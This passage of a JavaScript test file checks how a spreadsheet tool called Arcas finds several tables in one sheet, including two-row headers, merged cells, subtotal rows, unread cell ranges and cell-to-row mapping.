  const V = [row("Cost report Q3"), row("Region", "Rate"), row("North", 0.2), row("South", 0.3), row(),
    row("Group", "Item", "Costs", "", "", "Total", "", "Owner", "Hours"), row("", "", "Jan", "Feb", "Mar", "", "", "Ann", 5)];
  const F = V.map(none);
  for (const [g, items] of [["East", ["a", "b", "c"]], ["West", ["d", "e", "f"]]]) {
    items.forEach((it, k) => { V.push(row(k ? "" : g, it, 1 + k, 2 + k, 3 + k, 6 + 3 * k, "", ...(V.length < 9 ? ["Bob", 6] : []))); F.push(none()); });
    V.push(row("", `Subtotal ${g}`, 6, 9, 12, 27));
    F.push(Object.assign(none(), { 2: "=SUM(R[-3]C:R[-1]C)", 3: "=SUM(R[-3]C:R[-1]C)", 4: "=SUM(R[-3]C:R[-1]C)", 5: "=SUM(R[-3]C:R[-1]C)" }));
  }
  V.push(row("", "Costs are in thousands of US dollars, before tax"));
  F.push(none());
  V.push(row(), row(), row("Pass mark", 40), row(), row("Leave requests"), row("Request", "From", "Days"),
    ...Array.from({ length: 4 }, (_, k) => row(`R${k}`, 46000 + k, 2 + k)));
  while (F.length < V.length) F.push(none());
  const merged = ["A1:I1", "A6:A7", "B6:B7", "C6:E6", "F6:F7", "A8:A10", "A12:A14"];
  const { tables, unread } = tablesFromGrid(V, null, 0, 0, F, { merged });
  assert.deepEqual(tables.map((t) => [t.startRow, t.startCol, t.columns]), [
    [1, 0, ["Region", "Rate"]],
    [6, 0, ["Group", "Item", "Costs Jan", "Costs Feb", "Costs Mar", "Total"]],
    [5, 7, ["Owner", "Hours"]],
    [21, 0, ["Request", "From", "Days"]]], "AH-212: four tables, each at its own place, a header of two rows named from both");
  const main = tables[1];
  assert.equal(main.rows.length, 9, "the main table's data: rows 8 to 16");
  assert.deepEqual(main.layout, [3, 7, 8], "AH-212: the two subtotals and the notes row are no records");
  assert.deepEqual(main.fills, [[1, 0, "East"], [2, 0, "East"], [5, 0, "West"], [6, 0, "West"]], "AH-212: a label merged down its group, for the scan only");
  assert.equal(main.rows[1][0], "", "the sheet's own values are kept: what Accept and Undo compare");
  const sent = sentOf(main);
  assert.deepEqual(sent.rows[1].slice(0, 2), ["East", "b"]);
  assert.ok(sent.rows[3].every((v) => v === "") && sent.calc[3].every((f) => f === null), "a subtotal goes to the engine blank, with no formula");
  assert.deepEqual(sentOf(tables[0]).rows, tables[0].rows, "a table with no layout row is sent as it is");
  assert.deepEqual(unread, ["A19:B19"], "AH-212: a label and its number with no header are no table, and said");
  // a column that writes its summary formula on most rows (a rolling average) is a column of its own, never a subtotal;
  // a summary formula the column writes on a quarter of its rows still is
  {
    const G = [row("Title"), row(), row("Day", "Sales", "Avg 3"), ...Array.from({ length: 8 }, (_, k) => row(`d${k}`, 10 + k, 11))];
    const R = G.map(none);
    const at = (rows) => { R.forEach((r, k) => (r[2] = k > 2 && rows.includes(k) ? "=AVERAGE(R[-2]C:R[-1]C)" : null)); return tablesFromGrid(G, null, 0, 0, R, { merged: ["A1:C1"] }).tables[0].layout; };
    assert.deepEqual(at([3, 4, 5, 6, 7, 8, 9, 10]), [], "AH-212: a rolling average on every row is no subtotal");
    assert.deepEqual(at([5, 9]), [2, 6], "AH-212: a summary formula on 2 rows is each a subtotal");
  }
  // a header of two rows: day numbers under a merged Q1 and an unmerged Q2 (a month of one week has no merge); a first data
  // row with a blank under a header is no second header row
  {
    const G = [["Item", "Q1", "", "Q2"], ["", 1, 2, 3], ["a", 4, 5, 6], ["b", 7, 8, 9], ["", "", "", ""], ["Code", "Qty", "Note", ""], ["x", 5, "", ""], ["y", 6, "ok", ""]];
    const [q, c] = tablesFromGrid(G, null, 0, 0, null, { merged: ["B1:C1"] }).tables;
    assert.deepEqual([q.startRow, q.columns], [1, ["Item", "Q1 1", "Q1 2", "Q2 3"]], "AH-212: half the second row under a merged group names its columns");
    assert.deepEqual([c.startRow, c.columns.slice(0, 3)], [5, ["Code", "Qty", "Note"]], "AH-212: a data row is no second header row");
  }
  // labels: a header holds words, years or dates, never a plain number; a typed total on a row sparser than most is a
  // subtotal, a full row that says Total (a vendor, Total Wine) a record; one short word alone on a row is a record too
  {
    const G = [["Region", 2024, 2025], ["North", 5, 6], ["South", 7, 8], ["Grand total", 12, ""], ["", "", ""],
      ["Vendor", "Qty", "Ref"], ["Total Wine", 3, "a"], ["Acme", 4, "b"], ["R9", "", ""], ["", "", ""], ["Pass mark", 40, ""]];
    const { tables: [y, v], unread: u } = tablesFromGrid(G, null, 0, 0, null);
    assert.deepEqual([y.columns, y.layout, v.columns, v.layout, u], [["Region", "2024", "2025"], [2], ["Vendor", "Qty", "Ref"], [], ["A11:B11"]]);
    // under a table of 4 columns, a label and its number are no row of it; a block 3/4 as full is
    const T = [["Item", "Qty", "Cost", "Ref"], ["a", 1, 2, "x"], ["b", 3, 4, "y"], ["", "", "", ""]];
    assert.deepEqual(tablesFromGrid([...T, ["Pass mark", 40, "", ""]], null, 0, 0, null).unread, ["A5:B5"]);
    assert.deepEqual(tablesFromGrid([...T, ["c", 5, 6, ""]], null, 0, 0, null).tables.map((t) => t.rows.length), [4]);
  }
  // a header of two rows under no merge: words in the second row where the first is blank beside its group, numbers below
  {
    const G = [row("Item", "Costs", "", "Owner"), row("", "Jan", "Feb", ""), row("a", 1, 2, "Ann"), row("b", 3, 4, "Bob"), row("Title", "", "", "")];
    const t = tablesFromGrid(G.slice(0, 4).map((r) => r.slice(0, 4)), null, 3, 1, null).tables[0];
    assert.deepEqual([t.startRow, t.startCol, t.columns], [4, 1, ["Item", "Costs Jan", "Costs Feb", "Owner"]]);
    const flat = tablesFromGrid([["Item", "Owner", "Qty"], ["a", "Ann", 1], ["b", "", "x"]], null, 0, 0, null).tables[0];
    assert.equal(flat.startRow, 0, "AH-212: a first data row of words is no second header row when it fills under every header");
  }
  // blank rows inside one table: the rows below, as full as its own, are more of it; a header there starts a new table
  {
    const G = [["Item", "Qty", "Total"], ["a", 5, 10], ["b", 6, 12], ["", "", ""], ["c", 7, 14], ["d", 8, 16]];
    assert.deepEqual(tablesFromGrid(G, null, 0, 0, null).tables.map((t) => t.rows.length), [5]);
    const H = [...G, ["", "", ""], ["Code", "Name", "Price"], ["x", "y", 3]];
    assert.deepEqual(tablesFromGrid(H, null, 0, 0, null).tables.map((t) => [t.startRow, t.rows.length]), [[0, 5], [7, 1]]);
    // a table three blank rows below is its own, never more of the one above
    const far = [...G.slice(0, 3), ["", "", ""], ["", "", ""], ["", "", ""], ["c", 7, 14]];
    assert.deepEqual(tablesFromGrid(far, null, 0, 0, null).tables.map((t) => t.rows.length), [2], "AH-212: 3 blank rows end a table");
    const near = [...G.slice(0, 3), ["", "", ""], ["", "", ""], ["c", 7, 14]];
    assert.deepEqual(tablesFromGrid(near, null, 0, 0, null).tables.map((t) => t.rows.length), [5], "AH-212: 2 blank rows do not");
  }
  // the pane holds a sheet of several tables as one, rows one after another: each table's startRow + 2 + g is still the
  // sheet row of row g, so every place that turns a row into a cell stays as it was
  const s = asSheet(tables, { sheet: "Costs", unread });
  assert.equal(s.rows.length, 2 + 9 + 3 + 4);
  assert.equal(place(s, 3), s.tables[1]);
  assert.equal(place(s, 3).startRow + 2 + 3, 9, "row 3 of the sheet object is sheet row 9 (Item b)");
  assert.deepEqual(local(place(s, 3)).rows, main.rows, "the engine gets a table's own rows");
  assert.equal(local(place(s, 3)).startRow, 6);
  assert.equal(biggest(s).columns, main.columns);
  assert.equal(rowAt(s, "C9"), 3);
  assert.equal(rowAt(s, "H8"), 12, "a cell of the table beside it is that table's row");
  assert.equal(rowAt(s, "Costs!B9:D9"), 3);
  assert.equal(rowAt(s, "A19"), null, "a cell no table holds opens no row");
  assert.equal(rowAt(s, "B9:B10"), null);
  const one = asSheet([tables[0]], { sheet: "S" });
  assert.equal(place(one, 1), one, "a sheet of one table is that table");
  assert.equal(local(one), one);
  assert.equal(rowAt(one, "B4"), 1);
  assert.deepEqual(formatRows(tables.slice(0, 3), 0, 30), [], "every table's first rows inside the top 30 read");
  assert.deepEqual(formatRows(tables, 0, 30), [[30, 12]], "a table whose first rows run past the top 30: the rest of them");
  assert.deepEqual(formatRows([{ startRow: 88 }], 3, 30), [[84, 22]], "a table lower down: its header's two rows and its first 20");
  assert.deepEqual(areaOf("Sheet1!$C$6:$E$6"), { r1: 5, c1: 2, r2: 5, c2: 4 });
  assert.equal(areaOf("'a,b"), null);
  assert.equal(unreadSaid([]), "");
  assert.equal(unreadSaid(["A25"]), "Cell A25 on this sheet was not checked: it holds no table Arcas can read.");
  assert.equal(unreadSaid(["A4:A5", "C4:C5"]), "Cells A4:A5 and C4:C5 on this sheet were not checked: they hold no table Arcas can read.");
  assert.equal(unreadSaid(["A1:B2", "C3", "D4", "E5", "F6"]), "Cells A1:B2, C3, D4 and 2 more on this sheet were not checked: they hold no table Arcas can read.");
  // live: a finding in the table beside the main one is said at its own cell
  const verdicts = Array.from({ length: 18 }, () => ({}));
  verdicts[12] = { severity: "Medium", cells: ["Hours"], reason: "Hours 7", exact: { Hours: "y" } };
  verdicts[1] = { exact: { Rate: "x" } };
  verdicts[3] = { exact: { Hours: "z" } }; // the main table has no Hours: nothing to fix there
  assert.deepEqual(findingsAt(verdicts, s, {}, ["I8"]).map((f) => [f.cell, f.column]), [["I8", "Hours"]]);
  assert.deepEqual(exactFixes(verdicts, (k) => place(s, k).columns).map((x) => [x.k, x.j]), [[1, 1], [12, 1]]);
}
// AH-212: a plain sheet, one table and no merged area, is read exactly as tableFromGrid always read it: every adversarial
// bench table, the e2e's sheets of titles over a header, and one whose title rows sit far above
{
  const dir = new URL("../backend/bench/adversarial/", import.meta.url);
  const grids = [];
  for (const ep of readdirSync(dir).filter((d) => d.startsWith("ep"))) for (const f of readdirSync(new URL(`${ep}/`, dir))) {
    const t = JSON.parse(readFileSync(new URL(`${ep}/${f}`, dir), "utf8"));
    grids.push([[t.columns, ...t.rows], [t.columns.map(() => null), ...(t.formulas || t.rows.map((r) => r.map(() => null)))]]);
  }
  grids.push([[["Cost Report"], ["Period 9"], [""], ["Code", "Item", "Budget"], ["03-1", "Pour", 500], ["03-2", "Form", 700]].map((r) => [...r, "", ""].slice(0, 3)), null]);
  grids.push([[["Item", "Units", "Total"], ["Pen", 4, 8], ["Total", "", 8]], null]);
  assert.ok(grids.length >= 42);
  for (const [g, calc] of grids) {
    const { tables, unread } = tablesFromGrid(g, null, 2, 1, calc);
    const { fills, layout, ...t } = tables[0];
    assert.deepEqual([tables.length, t, fills, layout, unread], [1, tableFromGrid(g, null, 2, 1, calc), [], [], []], `AH-212: a plain sheet read as before (${g[0].slice(0, 3)})`);
  }
}

console.log("panel self-check passed");
